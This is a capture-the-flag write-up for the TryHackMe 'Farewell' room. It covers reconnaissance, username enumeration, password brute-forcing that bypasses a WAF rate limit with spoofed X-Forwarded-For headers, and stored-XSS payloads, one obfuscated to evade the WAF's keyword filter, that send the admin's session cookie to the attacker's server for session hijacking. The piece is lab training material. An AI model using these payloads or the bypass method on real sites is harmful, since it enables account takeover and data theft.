---
title: WRITEUP - Farewell
description: TryHackMe - Bypassing WAF
date: 2026-05-26
---
## Introduction
The room leaves out 2 objectives and a background:
```
Use red-teaming techniques to bypass the WAF and obtain admin access to the web application.

The farewell server will be decommissioned in less than 24 hours. Everyone is asked to leave one last message, but the admin panel holds all submissions. Can you sneak into the admin area and read every farewell message before the lights go out?

Note: In case you want to start over or restart all services, visit http://MACHINE_IP/status.php.

What is the flag value after logging in as a normal user?
What is the flag value after logging in as admin?
```

Source: https://tryhackme.com/room/farewell

A Web Application Firewall (WAF) is a security solution that monitors, filters, and blocks malicious HTTP/HTTPS traffic flowing between the internet and a web application.
## Initial Reconnaissance
### Port Scanning
I started off to scan the target for any open ports:
```
sudo nmap -p- -sC -sV -T4 10.81.139.16
sudo: unable to resolve host ip-10-81-82-237: Name or service not known
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-26 07:21 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.81.139.16
Host is up (0.00025s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Farewell \xE2\x80\x94 Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.34 seconds
```

Purely from this simple scan, we can identify that the target hosts a website which the attribute `httponly` flag's is not set.

When a cookie is marked as `HttpOnly`, scripts running in the browser are not able to read its value. This makes it harder for many XSS attacks to steal session cookies or other sensitive data stored in cookies.

Thankfully we do have that option to steal the cookie, which may help us to steal a session for privilege escalation.

### Directory Scanning
I then proceeded to scan any files that end with the `.php,js,py,txt` extensions and any directories present in the target site:
```
gobuster dir -u http://10.81.139.16/ -w '/root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt' -x .php,js,py,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.81.139.16/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,txt,php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 5246]
/.php                 (Status: 403) [Size: 780]
/info.php             (Status: 200) [Size: 87575]
/admin.php            (Status: 403) [Size: 780]
/status.php           (Status: 200) [Size: 3467]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/check.js             (Status: 200) [Size: 2027]
/auth.php             (Status: 403) [Size: 780]
/dashboard.php        (Status: 302) [Size: 0] [--> /]
/server-status        (Status: 403) [Size: 780]
Progress: 1091375 / 1091380 (100.00%)
===============================================================
Finished
===============================================================
```

I have found multiple interesting files:
- `/admin.php` - which is an admin login page, with only a password input field.
- `./php` - which tells us that the website uses a WAF:
```html
.
.
.
<body>
  <h1>\U0001f6ab 403 - Access Forbidden</h1>
  <p>Sorry, you don\u2019t have permission to access this page. WAF is Active</p>
  <p><a href="/"> Go back to the main site</a></p>
</body>
```
- `/check.js` - which is being executed when checking for username and password at the login page.

### Code analysis
The file `/check.js` contains a clue for the password:

```js
.
.
.
if (data && data.error === 'auth_failed') {
      // Show the returned hint if present
      if (data.user && data.user.password_hint) {
        showHint("Invalid password against the user");
      } else {
        showAlert('Invalid username or password.');
      }
    } else {
      showAlert('Unexpected response from server.');
      console.warn('Server response:', data);
    }
```
Meaning that if I entered the current username but incorrect password I then will get the message `Invalid password against the user`. So I would understand that the username exists and is correct.



The `/index.php` file which is the login page that users can login to, provides us with messages other users have written.
Which we can see from the source code:
```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Farewell \u2014 Login</title>
  <style>
    .
    .
    .
  </style>
</head>
<body>
  <nav class="nav" role="navigation" aria-label="Main">
    <div class="brand">
      <div class="logo">Bye</div>
      <div>
        <h2>Farewell</h2>
        <div class="sub">One last message from the old dashboard</div>
      </div>
    </div>
    <div class="sub">Servers decommission in 24h</div>
  </nav>

  <div class="ticker-wrap" aria-hidden="true">
    <div class="ticker" id="ticker">
      <!-- duplicated items for continuous scroll -->
      <div class="tick-item">adam posted a message - 3 hrs ago</div>
      <div class="tick-item">deliver11 posted a message - 4 hrs ago</div>
      <div class="tick-item">nora posted a message - 1 day ago</div>
    </div>
  </div>

  <main class="wrap" role="main" aria-labelledby="title">
    <div class="card" role="region" aria-labelledby="title">
      <h1 id="title">Welcome back</h1>
      <p class="lead">Sign in to post a farewell message</p>

      <div id="alert" style="display:none" class="err" role="alert"></div>
      <div id="hint" style="display:none" class="hint" role="status"></div>

      <form id="loginForm" method="post" action="#" onsubmit="return false;">
        <div>
          <label for="username">Username</label>
          <input id="username" name="username" type="text" autocomplete="username" required />
        </div>

        <div>
          <label for="password">Password</label>
          <input id="password" name="password" type="password" autocomplete="current-password" required />
        </div>

        <div class="meta">
          <button id="loginBtn" type="submit">Sign in</button>
        </div>
      </form>

    </div>
  </main>

<script src="check.js"></script>
</body>
</html>

```
Meaning we possibly found usernames: `adam` , `deliver11` , `nora`.

We can also observe that the `check.js` is indeed present  in the login page `<script src="check.js"></script>`.

When sending a request via for example `deliver11` and a random password in the login page I get: `Server hint: Invalid password against the user`. 
But if I have written a username that does not exist I get a message that does not tell me anything:`Invalid username or password.`.

Meaning we can now possible brute force the password.


## Brute Force
Upon looking at the post requests when trying to login as the users I get hints for the passwords for each user.

`deliver11`:
```http
POST /auth.php HTTP/1.1
Host: 10.81.139.16
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.81.139.16/
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: http://10.81.139.16
Connection: keep-alive
Cookie: PHPSESSID=m3k7nnek2k7iqqca9mv32hviv9
Priority: u=0

username=deliver11&password=123456
```
Response:
```http
HTTP/1.1 200 OK
Date: Tue, 26 May 2026 08:16:35 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 152
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=utf-8

{"error":"auth_failed","user":{"name":"deliver11","last_password_change":"2025-09-10 11:00:00","password_hint":"Capital of Japan followed by 4 digits"}}
```
---
Username: `nora`
```http
.
.
.
username=nora&password=123456
```
Response
```http
HTTP/1.1 200 OK
Date: Tue, 26 May 2026 08:17:25 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 126
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=utf-8

{"error":"auth_failed","user":{"name":"nora","last_password_change":"2025-08-01 13:45:00","password_hint":"lucky number 789"}}
```
---
Username: `adam`
```http
.
.
.
username=adam&password=123456
```
Response
```http
HTTP/1.1 200 OK
Date: Tue, 26 May 2026 08:18:16 GMT
Server: Apache/2.4.58 (Ubuntu)
Content-Length: 126
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=utf-8

{"error":"auth_failed","user":{"name":"adam","last_password_change":"2025-10-21 09:12:00","password_hint":"favorite pet + 2"}}
```

So to sum the password hints:
`deliver11`: `"password_hint":"lucky number 789"`
`nora`: `"password_hint":"lucky number 789"`
`adam`: `"password_hint":"favorite pet + 2"`

I chose the username `deliver11`, so I have written a script for passwords that generates `Tokyo` and numbers from `0000` to `9999`:
**Script 1**
```bash
for i in $(seq -w 0 9999); do
    echo "Tokyo$i"
done > passwords.txt
```

But sending requests to brute force will be stopped via WAF after 8 requests.
```http
HTTP/1.1 403 Forbidden
Date: Tue, 26 May 2026 08:34:27 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Mon, 03 Nov 2025 09:58:55 GMT
ETag: "30c-642adc362923c"
Accept-Ranges: bytes
Content-Length: 780
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html
```
Meaning the WAF does blocks our connection as a rate limit.

### Bypassing WAF
I tried to use the tactic of spoofing different IP addresses which will the request be originating from , meaning every request will be sent from a different IP address from WAF's point of view.

I have made a bash script to have a list of IP addresses:
**Script 2**
```bash
for c in $(seq 0 255); do
  for d in $(seq 0 255); do
    echo "192.168.$c.$d"
  done
done > ips_192_168.txt
```

I tried using burp suite for brute forcing but its incredible slow, therefor I changed the tool to `caido`.

I have captured the request to login.
```http
POST /auth.php HTTP/1.1
Host: 10.81.139.16
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.81.139.16/
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://10.81.139.16
Connection: keep-alive
Cookie: PHPSESSID=m3k7nnek2k7iqqca9mv32hviv9
Priority: u=0
X-Forwarded-For: {PLACEHOLDER_POSITION_1}

username=deliver11&password={PLACEHOLDER_POSITION_2}
```

To change each request to seem like its originating from a different IP I use the header: `X-Forwarded-For:` and used the list `ips_192_168.txt` which I have generated from script 2.

And for the second placeholder I chose the `passwords.txt` which I have also generated from script 1.

After running 10001 requests in a matter of seconds ,I checked to see for a difference of request length and found the password:
```http
POST /auth.php HTTP/1.1
Host: 10.81.139.16
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.81.139.16/
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: http://10.81.139.16
Connection: close
Cookie: PHPSESSID=m3k7nnek2k7iqqca9mv32hviv9
Priority: u=0
X-Forwarded-For: 192.168.3.242

username=deliver11&password=Tokyo1010
```
Username: `deliver11`
Password: `Tokyo1010`

#### First Flag
Now after we login in as `deliver11`  , we go to the dashboard and see the first flag: `THM{REDACTED}`.


## Privilege Escalation
After logging in , I have the option now to write a comment in an input field, which will probably be displayed for the admin ,meaning we could steal his cookie and session since he attribute `OnlyHttp` is false.

Before sending any stored XSS javascript ,I opened a python server to listen for upcoming requests:
```bash
python3 -m http.server
```

I tried leaving a simple stored XSS message to check for WAF:
```html
<img src=x onerror=fetch("https://10.81.82.237:8000?x=" + btoa(document["cookie"]))>
```
Here we basically try to use the `img` tag via source equals to x, because it immediately bring an error, which then executes a fetch command that proceeds to send to the IP `10.81.82.237` which is the attacker (me) the cookie that will be encoded to `base64`.

Since there is a WAF , the request have gotten filtered and I got a 403 response.
The input also has a limit of 100 characters.

---

I tried using different payloads, which I have then concluded that it is likely that the WAF blocks requests that contain literal words like: `fetch` , `cookie`,`<script>`.

I tried the payload:
```js
<iframe onload="new Image().src='http://10.82.71.101:8000?x='+document['coo'+'kie']">
```
Here we create an embedded `iframe`, which the javascript inside executes when the `iframe` finishes loading. We then create an element of `img` which having the `.src` setting, forces the browser to make an HTTP request to that URL.

I did minimal obfuscation for the cookie word to bypass WAF and we also did not use `fetch`.

which succeeded and we got a response back of the admin's cookie:
```bash
python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.82.159.189 - - [26/May/2026 12:15:11] "GET /?x=PHPSESSID=9l6lqmkp4du5khfk2g02j84n4d HTTP/1.1" 200 -
```

#### Second Flag

I went to `/admin.php` , which is the login page for the admin, replaced the cookies with the admin's cookie which is `9l6lqmkp4du5khfk2g02j84n4d` , and logged in as the admin.

Which in his dashboard I found the second key: `THM{REDACTED}`.
